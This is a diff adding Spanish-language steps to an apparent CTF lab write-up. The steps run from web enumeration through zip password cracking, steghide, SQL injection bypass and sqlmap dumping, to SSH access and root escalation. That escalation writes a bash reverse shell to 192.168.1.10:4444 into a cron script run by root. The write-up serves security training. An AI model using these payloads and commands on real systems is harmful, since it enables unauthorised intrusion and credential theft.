@@ -182,62 +182,107 @@ Progress: 4614 / 4615 (99.98%)
 <pre>
   <img src="IMG/RD10.png">
 </pre>
+<p>Durante la enumeración web se descubrió un archivo interesante en la ruta
+http://192.168.1.8/staging/zone1/zone2/dummy.txt.
+Al abrirlo, el contenido estaba lleno de texto de relleno (Lorem ipsum), pero entre las líneas se ocultaba una cadena alfanumérica sospechosa:
+L2R1YXJ0ZS1zYW5jaGV6</p>
 
 <pre>
   <img src="IMG/RD11.png">
 </pre>
+<p>Usamos CyberChef para aplicar la operación From Base64 sobre el string L2R1YXJ0ZS1zYW5jaGV6. Con las opciones de modo estricto y limpieza de caracteres activadas, el resultado revela la ruta /duarte-sanchez.
+</p>
 
 <pre>
   <img src="IMG/RD12.png">
 </pre>
+<p>en /duarte-sanchez/ se localizó un archivo comprimido llamado
+absurd_message_3.zip.</p>
 
 <pre>
   <img src="IMG/RD13.png">
 </pre>
+<p>Se utiliza zip2john absurd3.zip > hash.txt para extraer el hash del archivo ZIP protegido. Esto genera un archivo hash.txt con el hash compatible para John the Ripper.
+Luego se ejecuta john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt para realizar un ataque de diccionario usando el wordlist rockyou.txt. El resultado muestra que la contraseña del archivo es freedom.
+</p>
 
 <pre>
   <img src="IMG/RD14.png">
 </pre>
+<p>Se ejecuta unzip absurd_message_3.zip para extraer el contenido del archivo ZIP. El sistema solicita la contraseña, previamente identificada como freedom. Al ingresarla correctamente, se extrae el archivo absurd3.txt.
+</p>
 
 <pre>
   <img src="IMG/RD15.png">
 </pre>
+<p>Se ejecuta cat absurd3.txt para visualizar el contenido del archivo previamente descomprimido. El mensaje dentro del archivo indica una ruta específica: /trinitarios/logs.
+</p>
 
 <pre>
   <img src="IMG/RD16.png">
 </pre>
+<p>dentro del directorio /trinitarios/logs encontramos un zip llamado mella_key.zip</p>
 
 <pre>
   <img src="IMG/RD17.png">
 </pre>
+<p>Se ejecuta john --wordlist=/home/user/darkhaze/rockyou.txt hashMella.txt para realizar un ataque de diccionario sobre el hash extraído del archivo mella_key.zip. El resultado muestra que la contraseña encontrada es libertad.
+</p>
 
 <pre>
   <img src="IMG/RD18.png">
 </pre>
+<p>Tras descomprimir mella_key.zip con la contraseña libertad, se accede al archivo mella_key.txt, que contiene la cadena:
+Mella#2025_Salt&Shadow_Key!
+Este valor puede funcionar como clave para descifrado o autenticación.
+Luego se inspecciona note.txt, cuyo contenido es un mensaje cifrado en formato hexadecimal.
+</p>
 
 <pre>
   <img src="IMG/RD19.png">
 </pre>
+<p>descargamos la imagen Mella.jpg que esta en el directorio /images</p>
 
 <pre>
   <img src="IMG/RD20.png">
 </pre>
+<p>Se ejecuta steghide extract -sf Mella.jpg con su contraseña: Mella#2025_Salt&Shadow_Key! para extraer información oculta mediante esteganografía. El proceso finaliza exitosamente, generando el archivo flag_mella.txt.
+Al visualizar su contenido con cat flag_mella.txt, se revela la 1ra flag de la maquina.
+</p>
 
 <pre>
   <img src="IMG/RD21.png">
 </pre>
+<p>Se utiliza CyberChef con la operación From Hex para decodificar una cadena hexadecimal. El resultado revela el siguiente mensaje en texto plano:
+Mella, don't forget to check /tmp/resistencia-php, it's your responsibility.
+</p>
 
 <pre>
   <img src="IMG/RD22.png">
 </pre>
+<p>Se accede al directorio /tmp-resistencia-php en el servidor 192.168.1.8, el cual está siendo servido por Apache 2.4.41. La respuesta muestra un índice de archivos habilitado, lo que permite visualizar directamente el contenido del directorio.
+Se identifican dos archivos PHP:
+login.php 
+y welcome.php
+Ambos fueron modificados el mismo día, lo que sugiere que forman parte de una funcionalidad conjunta, posiblemente un sistema de autenticación o acceso controlado.
+</p>
 
 <pre>
   <img src="IMG/RD23.png">
 </pre>
+<p>Se accede al endpoint /tmp-resistencia-php/login.php, lo que revela una página de inicio de sesión.
+</p>
 
 <pre>
   <img src="IMG/RD24.png">
 </pre>
+<p>Se accede al endpoint /tmp-resistencia-php/login.php y se logra iniciar sesión utilizando el payload clásico de SQL Injection:
+' OR 1=1 --
+Este vector manipula la lógica de autenticación, forzando la condición a verdadera sin necesidad de credenciales válidas.
+Como resultado, el sistema redirige al usuario al endpoint /welcome.php, donde se muestra el mensaje:
+Bienvenido, alice
+Has accedido correctamente.
+</p>
 
 <pre>
   <img src="IMG/RD25.png">
@@ -246,6 +291,16 @@ Progress: 4614 / 4615 (99.98%)
 <pre>
   <img src="IMG/RD26.png">
 </pre>
+<p>Se utiliza la herramienta sqlmap para automatizar el análisis de inyección SQL sobre el endpoint http://10.10.11.176/tm-resistencia.php?login.php, enviando los parámetros username=TEST&password=TEST mediante una solicitud POST.
+El escaneo identifica múltiples vectores de inyección:
+- Boolean-based blind:
+Payload exitoso:
+username=TEST' AND 9806=9806 AND '9806'='9806 ...
+- Error-based (MySQL >= 5.0):
+Payload:
+username=TEST' AND (SELECT 7702 FROM(SELECT COUNT(*),CONCAT(...)
+Ambos vectores confirman que el parámetro username es vulnerable a inyección SQL, y que el backend responde de forma predecible a manipulaciones en la cláusula WHERE
+</p>
 
 <pre>
   <img src="IMG/RD27.png">
@@ -254,6 +309,13 @@ Progress: 4614 / 4615 (99.98%)
 <pre>
   <img src="IMG/RD28.png">
 </pre>
+<p>El siguiente comando lanza una inyección SQL automatizada sobre el endpoint vulnerable, utilizando el método POST y solicitando la enumeración de bases de datos (--dbs).
+El escaneo confirma que el backend utiliza MySQL 8.0.22, corriendo sobre Linux Ubuntu 20.10 con Apache 2.4.41 y PHP 7.4.3. SQLMap logra conectarse exitosamente y enumera las siguientes bases de datos:
+- information_schema
+- sql_data1
+- sql_data2
+- sql_data3
+</p>
 
 <pre>
   <img src="IMG/RD29.png">
@@ -262,6 +324,11 @@ Progress: 4614 / 4615 (99.98%)
 <pre>
   <img src="IMG/RD30.png">
 </pre>
+<p>En sql_data3 se identifican las siguientes tablas:
+- accounts
+- audit
+- roles
+</p>
 
 <pre>
   <img src="IMG/RD31.png">
@@ -270,50 +337,95 @@ Progress: 4614 / 4615 (99.98%)
 <pre>
   <img src="IMG/RD32.png">
 </pre>
+<p>SQLMap confirma conexión exitosa al backend MySQL, y extrae los siguientes registros</p>
+<ul><li>id:1 |password: alice_pw      | username: alice   | created_at: 2025-09-19 17:34:30</li></ul>
+<ul><li>id:2 |password: bob_pw        | username: bob     | created_at: 2025-09-19 17:34:30</li></ul>
+<ul><li>id:3 |password: YoSoyLaBandera| username: sanchez | created_at: 2025-09-19 17:34:30</li></ul>
+<p>Este paso demuestra acceso total a datos sensibles. El campo password está en texto plano, lo que confirma que no se aplicó hashing ni cifrado, representando una falla crítica de seguridad. El usuario sanchez con la contraseña YoSoyLaBandera podría tener privilegios elevados, dada la naturaleza del identificador.
+</p>
 
 <pre>
   <img src="IMG/RD33.png">
 </pre>
+<p>accedamos por medio de ssh con las credenciales, sanchez:YoSoyLaBandera</p>
 
 <pre>
   <img src="IMG/RD34.png">
 </pre>
+<p>Se ejecuta el comando ls -la, que revela archivos ocultos y visibles en el directorio personal del usuario.
+entre ellos se encuentra el archivo flag_sanchez.txt contiene una cadena que parece ser una flag o parte de una, posiblemente codificada o cifrada</p>
 
 <pre>
   <img src="IMG/RD35.png">
 </pre>
+<p>Se utiliza CyberChef para aplicar la operación From Base64, lo que revela el mensaje decodificado:
+Duarte, where did you hide the message?
+</p>
 
 <pre>
   <img src="IMG/RD36.png">
 </pre>
+<p>e intenta acceder a otros directorios dentro de /home, específicamente:
+- /home/duarte
+- /home/ubuntu
+- /home/vagrant
+Sin embargo, todos los intentos fallan con el error:
+-bash: cd: [directorio]: Permission denied
+</p>
 
 <pre>
   <img src="IMG/RD37.png">
 </pre>
+<p>se navega manualmente por la ruta /usr/games/message, donde se encuentra el archivo note.txt, con contenidos en hexadecimal. 
+</p>
 
 <pre>
   <img src="IMG/RD38.png">
 </pre>
+<p> se revela la siguiente URL:
+https://www.instagram.com/dominican_republic_thm
+</p>
 
 <pre>
   <img src="IMG/RD39.png">
 </pre>
+<p>Durante la exploración del perfil de Instagram dominican_republic_thm, se detecta manualmente una cadena en la biografía que sigue el patrón clásico de credenciales:
+duarte:DiosPatriaLibertad1844
+</p>
 
 <pre>
   <img src="IMG/RD40.png">
 </pre>
+<p>Utilizando la credencial identificada en el perfil externo (duarte:DiosPatriaLibertad1844), se establece sesión en el sistema como el usuario duarte. El prompt confirma el acceso:
+duarte@Dominican-Republic-thm
+Se ejecuta ls -la para listar los archivos del directorio personal, revelando elementos típicos del entorno (.bash_history, .cache, backup, etc.) y la 2da flag, flag_sanchez.txt
+</p>
 
 <pre>
   <img src="IMG/RD41.png">
 </pre>
+<p>Dentro del directorio /home/duarte/backup, se encuentra el archivo script.sh con permisos de ejecución (-rwxr-xr-x) y propiedad del usuario duarte. El contenido del script es:
+#!/bin/bash
+echo "root whispers: hello!"</p>
+
+<p>
+Este script, aunque simple, representa una vía de interacción entre el usuario duarte y el contexto de privilegios elevados. Al inspeccionar el archivo /etc/crontab, se observa que se ha añadido una nueva línea:
+</p>
+<p>* * * * * root /home/duarte/backup/script.sh</p>
+<p>Esto configura una tarea cron que ejecuta el script cada minuto como el usuario root. </p>
 
 <pre>
   <img src="IMG/RD42.png">
 </pre>
+<p>El archivo script.sh, ubicado en /home/duarte/backup, es modificado para incluir una reverse shell:
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
+</p>
 
 <pre>
   <img src="IMG/RD43.png">
 </pre>
+<p>Se accede al directorio /root, donde esta la ultima flag y terminamos exitosamente la maquina.</p>
   
   </body>
 </html>
